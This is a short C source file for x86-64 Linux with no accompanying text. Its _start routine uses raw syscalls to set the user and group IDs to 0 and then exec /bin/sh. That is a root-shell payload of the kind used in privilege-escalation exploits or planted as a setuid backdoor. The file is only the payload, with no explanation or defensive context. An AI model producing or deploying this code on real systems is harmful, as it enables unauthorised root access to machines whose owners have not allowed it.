#include <sys/syscall.h>

static long sc(long n, long a, long b, long c)
{
    long r;
    __asm__ volatile("syscall" : "=a"(r) : "0"(n), "D"(a), "S"(b), "d"(c) : "rcx", "r11", "memory");
    return r;
}

void _start(void)
{
    sc(SYS_setuid, 0, 0, 0);
    sc(SYS_setgid, 0, 0, 0);
    sc(SYS_execve, (long)"/bin/sh", 0, 0);
    sc(SYS_exit, 1, 0, 0);
}
